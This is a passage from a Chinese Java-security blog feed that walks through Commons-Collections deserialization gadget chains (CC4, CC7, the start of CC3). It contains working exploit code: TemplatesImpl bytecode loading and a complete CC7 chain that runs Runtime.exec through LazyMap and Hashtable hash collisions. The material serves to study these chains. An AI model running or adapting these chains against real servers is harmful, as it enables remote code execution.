class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//触发攻击链子</span><br>                <span class="hljs-comment">//其实这里可以不用这个，因为我们不再需要进入setValue方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//与CC1前半部分链子结合一下</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有弹出计算器</p><ul><li>把断点打在了 <code>AbstractMap.equals()</code> 的地方，结果发现居然没有执行到 .equals() 这个方法，去看一看 yso 的链子是怎么写的。</li></ul><p><img src="/img/CC4/c18.png"></p><p>yso 这里的链子比我们多了一个 map，而且将两个 map 进行了比较，一看到这个就明白了。</p><ul><li><strong>为什么要调用两次 <code>put()</code>?</strong></li></ul><p>我们需要调用的 <code>e.key.equal()</code> 方法是在 for 循环里面的，需要进入到这 for 循环才能调用。</p><p><code>Hashtable</code> 的 <code>reconstitutionPut()</code> 方法是被遍历调用的，</p><p>第一次调用的时候，并不会走入到 <code>reconstitutionPut()</code> 方法 for 循环里面，因为 <code>tab[index]</code> 的内容是空的，在下面会对 <code>tab[index]</code> 进行赋值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br>        <span class="hljs-keyword">throws</span> StreamCorruptedException<br>&#123;<br>    <span class="hljs-comment">// 私有方法 reconstitutionPut：在反序列化重组过程中，将键（Key）和值（Value）放入条目数组（tab）中。</span><br>    <span class="hljs-comment">// 参数 tab: 哈希桶数组（存储链表的数组）</span><br>    <span class="hljs-comment">// 参数 key: 要放入的键</span><br>    <span class="hljs-comment">// 参数 value: 要放入的值</span><br>    <span class="hljs-comment">// 可能抛出 StreamCorruptedException: 表示在反序列化过程中检测到数据流损坏异常</span><br><br>    <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>    &#125;<br>    <span class="hljs-comment">// 如果传入的值为空（null），则抛出 StreamCorruptedException 异常。</span><br>    <span class="hljs-comment">// （因为 Hashtable 通常不允许存储 null 值）</span><br><br>    <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>    <span class="hljs-comment">// This should not happen in deserialized version.</span><br>    <span class="hljs-comment">// 确保该键尚未存在于哈希表中。</span><br>    <span class="hljs-comment">// 在反序列化的版本中，这种情况不应该发生。</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>    <span class="hljs-comment">// 计算键的哈希码（hashCode）</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>    <span class="hljs-comment">// 通过将哈希码与 0x7FFFFFFF（最大正整数）进行按位与操作确保其为非负数，</span><br>    <span class="hljs-comment">// 然后对数组长度取模，得到该键值对应放入的数组下标（index）。</span><br><br>    <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>        <span class="hljs-comment">// 遍历该数组下标处的链表（如果存在）</span><br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>            <span class="hljs-comment">// 如果找到了一个已存在的条目，其哈希码与当前键的哈希码相同，</span><br>            <span class="hljs-comment">// 并且键本身也相等（通过 equals 方法判断）</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            <span class="hljs-comment">// 则抛出 StreamCorruptedException 异常。</span><br>            <span class="hljs-comment">// 因为在反序列化时，不应该出现重复的键，这表明数据流可能已损坏。</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// Creates the new entry.</span><br>    <span class="hljs-comment">// 创建新的条目。</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>    <span class="hljs-comment">// 这是一个不检查的转换，获取当前数组下标处的第一个条目（链表头节点）</span><br><br>    tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>    <span class="hljs-comment">// 在数组的 index 位置创建一个新的 Entry 对象。</span><br>    <span class="hljs-comment">// 这个新条目将：</span><br>    <span class="hljs-comment">//   - 存储当前的 hash、key、value</span><br>    <span class="hljs-comment">//   - 将其 next 指针指向原来的链表头（e）</span><br>    <span class="hljs-comment">// 这相当于将新节点插入到链表的头部。</span><br><br>    count++;<br>    <span class="hljs-comment">// 增加哈希表的条目计数器。</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>为什么调用的两次<code>put()</code>其中map中key的值分别为yy和zZ?</strong></li></ul><p>第二次调用 <code>reconstitutionPut()</code> 进入到 for 循环的时候，此时 e 是从 tab 中取出的 lazyMap1 ，然后进入到判断中，要经过 <code>(e.hash == hash)</code> 判断为真才能走到我们想要的 <code>e.key.equal()</code> 方法中。这里判断要求取出来的 lazyMap1 对象的hash值要等都现在对象也就是 lazyMap2 的hash值，这里的hash值是通过 lazyMap 对象中的 <code>key.hashCode()</code> 得到的，也就是说 lazyMap1 的 hash 值就是 <code>&quot;yy&quot;.hashCode()</code> ，lazyMap2 的 hash 值就是 <code>&quot;zZ&quot;.hashCode()</code> ，而在 java 中有一个小 bug：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;yy&quot;</span>.hashCode() == <span class="hljs-string">&quot;zZ&quot;</span>.hashCode()<br></code></pre></td></tr></table></figure><p>for循环是进行了一个列表的遍历，if中前半句是如果找到了一个已存在的条目，其哈希码与当前键的哈希码相同。</p><p><code>yy</code> 和 <code>zZ</code> 由 <code>hashCode()</code> 计算出来的值是一样的。正是这个小 bug 让这里能够利用，所以这里我们需要将 map 中 <code>put()</code> 的值设置为 <code>yy</code> 和 <code>zZ</code>，才能走到我们想要的 <code>e.key.equal()</code> 方法中。</p><ul><li><strong>为什么在调用完 <code>HashTable.put()</code> 之后，还需要在 map2 中 <code>remove()</code> 掉 yy？</strong></li></ul><p>这是因为 <code>HashTable.put()</code> 实际上也会调用到 <code>equals()</code> 方法：</p><p>当调用完 <code>equals()</code> 方法后，会进入LazyMap的get方法。</p><p>记得吗，这个类就是用来加入新的键，调用get将新的值加入key中</p><p>LazyMap2 的 key 中就会增加一个 yy 键：</p><p><img src="/img/CC4/c20.png"></p><p>在后续AbstractMap的equals方法中检测到两个 Map 的大小(包含的键值对数量)不相等直接返回false</p><p>无法调用get方法，触发接下来的利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>    <span class="hljs-comment">// 公共方法：判断当前对象是否与给定对象 o 相等</span><br>    <span class="hljs-comment">// 返回值：true 表示相等，false 表示不相等</span><br><br>    <span class="hljs-keyword">if</span> (o == <span class="hljs-built_in">this</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-comment">// 如果比较的对象 o 就是当前对象本身（内存地址相同）</span><br>    <span class="hljs-comment">// 则毫无疑问它们是相等的，直接返回 true</span><br><br>    <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">// 如果对象 o 不是 Map 类型（或不是 Map 接口的实现类）</span><br>    <span class="hljs-comment">// 则类型不同，肯定不相等，返回 false</span><br><br>    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<br>    <span class="hljs-comment">// 将对象 o 强制转换为 Map 类型，方便后续操作</span><br>    <span class="hljs-comment">// 这里的 &lt;?,?&gt; 表示键和值可以是任何类型</span><br><br>    <span class="hljs-keyword">if</span> (m.size() != size())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">// 如果两个 Map 的大小（包含的键值对数量）不相等</span><br>    <span class="hljs-comment">// 则它们肯定不相等，返回 false（这是一种快速失败优化）</span><br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 开始逐个比较键值对，使用 try 块捕获可能出现的异常</span><br>        <br>        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();<br>        <span class="hljs-comment">// 获取当前 Map 的条目集合（entrySet）的迭代器</span><br>        <span class="hljs-comment">// 用于遍历当前 Map 的所有键值对</span><br><br>        <span class="hljs-keyword">while</span> (i.hasNext()) &#123;<br>            <span class="hljs-comment">// 遍历当前 Map 的每一个键值对</span><br>            Entry&lt;K,V&gt; e = i.next();<br>            <span class="hljs-comment">// 获取下一个键值对条目</span><br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> e.getKey();<br>            <span class="hljs-comment">// 获取当前条目的键</span><br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> e.getValue();<br>            <span class="hljs-comment">// 获取当前条目的值</span><br><br>            <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// 如果当前条目的值为 null</span><br>                <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-literal">null</span> &amp;&amp; m.containsKey(key)))<br>                    <span class="hljs-comment">// 检查目标 Map m 中：</span><br>                    <span class="hljs-comment">//   1. 使用相同键获取的值必须也是 null (m.get(key)==null)</span><br>                    <span class="hljs-comment">//   2. 并且必须包含这个键 (m.containsKey(key))</span><br>                    <span class="hljs-comment">// 如果这两个条件不同时满足，则返回 false</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 如果当前条目的值不为 null</span><br>                <span class="hljs-keyword">if</span> (!value.equals(m.get(key)))<br>                    <span class="hljs-comment">// 检查当前值是否与目标 Map m 中相同键对应的值相等</span><br>                    <span class="hljs-comment">// 使用值的 equals 方法进行比较</span><br>                    <span class="hljs-comment">// 如果不相等，则返回 false</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 循环结束：当前 Map 的所有键值对都在目标 Map 中找到了匹配项</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException unused) &#123;<br>        <span class="hljs-comment">// 捕获类型转换异常：可能在强制类型转换或方法调用时发生</span><br>        <span class="hljs-comment">// 例如键或值的类型不兼容，返回 false</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (NullPointerException unused) &#123;<br>        <span class="hljs-comment">// 捕获空指针异常：可能在调用 null 对象的方法时发生</span><br>        <span class="hljs-comment">// 或者目标 Map 不支持 null 键/值，返回 false</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-comment">// 如果程序执行到这里，说明：</span><br>    <span class="hljs-comment">//   - 两个 Map 大小相同</span><br>    <span class="hljs-comment">//   - 当前 Map 的每个键值对都在目标 Map 中存在对应关系</span><br>    <span class="hljs-comment">//   - 所有对应的值都相等（正确处理了 null 值情况）</span><br>    <span class="hljs-comment">//   - 比较过程中没有抛出异常</span><br>    <span class="hljs-comment">// 因此判定两个 Map 相等，返回 true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>所以要删除yy键</p><ul><li>最后同样的，我们要反序列化才触发链子。所以要先给chainTransformer对象传入一个没用的东西，再通过反射修改值</li></ul><p>最终EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.AbstractMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br>        HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; hashMap2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        decorateMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        decorateMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(decorateMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(decorateMap2, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer, transformers);<br>        decorateMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全-CC3链</title>
    <link href="/2025/09/05/Java%E5%AE%89%E5%85%A8-CC3%E9%93%BE/"/>
    <url>/2025/09/05/Java%E5%AE%89%E5%85%A8-CC3%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-CC3链"><a href="#Java安全-CC3链" class="headerlink" title="Java安全-CC3链"></a>Java安全-CC3链</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>jdk8u65</li><li>Commons-Collections 3.2.1</li></ul><h2 id="TemplatesImpl-解析"><a href="#TemplatesImpl-解析" class="headerlink" title="TemplatesImpl 解析"></a>TemplatesImpl 解析</h2><ul><li><strong>利用 ClassLoader#defineClass 直接加载字节码</strong>–动态加载字节码</li><li><code>defineClass</code> 的职责是：<strong>将一个字节数组（byte[]），即 <code>.class</code> 文件的二进制内容，转换并注册为 JVM 中的一个有效的 <code>Class</code> 对象。</strong></li></ul><p><img src="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/ClassLoaderDefineClass.png"></p><p>这里我们可以正向看，首先是 <code>loadClass()</code>，它的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 <code>findClass()</code>。</p><p>对于 <code>findClass()</code> 方法</p><ul><li><p>根据名称或位置加载 .class 字节码,然后使用 defineClass，代码实例如下。</p></li><li><p>通常由子类去实现</p></li><li><p><code>defineClass()</code> 的作用是处理前面传入的字节码，将其处理成真正的 Java 类。</p></li></ul><blockquote><p>此时的 <code>defineClass()</code> 方法是有局限性的，因为它只是加载类，并不执行类。若需要执行，则需要先进行 <code>newInstance()</code> 的实例化。</p></blockquote><p>现在我们的 <code>defineClass()</code> 方法的作用域为 